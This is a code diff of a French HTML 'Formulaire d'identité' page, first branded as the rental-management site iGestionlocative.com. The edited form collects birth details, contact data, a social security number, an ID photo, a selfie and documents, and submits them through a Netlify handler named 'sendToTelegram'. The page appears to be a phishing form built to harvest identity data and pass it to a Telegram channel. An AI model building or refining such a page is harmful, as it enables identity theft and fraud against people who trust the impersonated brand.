@@ -2,75 +2,27 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Formulaire d'identité - iGestionlocative.com</title>
+  <title>Formulaire Identité</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <div class="logo">
-      <img src="https://files.oaiusercontent.com/file-000000001044a51f6ba7cdd0ec6c1a1f.jpg" alt="Logo iGestionlocative">
-      <div>
-        <h2>iGestionlocative.com</h2>
-        <p>Nr 1 pour votre gestion locative en ligne</p>
-      </div>
-    </div>
-    <form>
-      <div class="form-row">
-        <div class="form-group">
-          <label>Nom :</label>
-          <input type="text" name="nom" required>
-        </div>
-        <div class="form-group">
-          <label>Prénom :</label>
-          <input type="text" name="prenom" required>
-        </div>
-      </div>
-      <div class="form-group">
-        <label>Date de naissance :</label>
-        <input type="date" name="date_naissance" required>
-      </div>
-      <div class="form-group">
-        <label>Lieu de naissance :</label>
-        <input type="text" name="lieu_naissance" required>
-      </div>
-      <div class="form-group">
-        <label>Adresse e-mail :</label>
-        <input type="email" name="email" required>
-      </div>
-      <div class="form-group">
-        <label>Téléphone :</label>
-        <input type="tel" name="telephone" required>
-      </div>
-      <div class="form-group">
-        <label>Numéro de sécurité sociale :</label>
-        <input type="text" name="secu" required>
-      </div>
-      <div class="form-row">
-        <div class="form-group">
-          <label>Statut :</label>
-          <input type="text" name="statut">
-        </div>
-        <div class="form-group">
-          <label>Emploi :</label>
-          <input type="text" name="emploi">
-        </div>
-      </div>
-      <div class="form-group">
-        <label>Photo d'identité :</label>
-        <input type="file" name="photo_identite" accept="image/*">
-      </div>
-      <div class="form-group">
-        <label>Selfie :</label>
-        <input type="file" name="selfie" accept="image/*">
-      </div>
-      <div class="form-group">
-        <label>Upload votre selfie :</label>
-        <input type="file" name="selfie_upload" accept="image/*">
-      </div>
-      <div class="form-group">
-        <label>Upload vos documents :</label>
-        <input type="file" name="vip_upload" accept="image/*">
-      </div>
+    <img src="https://files.oaiusercontent.com/file-000000001044a51f6ba7cdd0ec6c1a1f.jpg" alt="Logo" height="60">
+    <h2>Formulaire d'identité</h2>
+    <form name="upload-form" method="POST" enctype="multipart/form-data" data-netlify="true" data-netlify-handler="sendToTelegram">
+      <input type="hidden" name="form-name" value="upload-form" />
+      <label>Nom : <input type="text" name="nom" required></label><br>
+      <label>Prénom : <input type="text" name="prenom" required></label><br>
+      <label>Date de naissance : <input type="date" name="date_naissance" required></label><br>
+      <label>Lieu de naissance : <input type="text" name="lieu_naissance" required></label><br>
+      <label>Email : <input type="email" name="email" required></label><br>
+      <label>Téléphone : <input type="tel" name="telephone" required></label><br>
+      <label>Numéro de sécurité sociale : <input type="text" name="secu" required></label><br>
+      <label>Statut : <input type="text" name="statut"></label><br>
+      <label>Emploi : <input type="text" name="emploi"></label><br>
+      <label>Photo d'identité : <input type="file" name="photo_identite" accept="image/*"></label><br>
+      <label>Selfie : <input type="file" name="selfie" accept="image/*"></label><br>
+      <label>Upload vos documents : <input type="file" name="vip_upload"></label><br>
       <button type="submit">Envoyer</button>
     </form>
   </div>
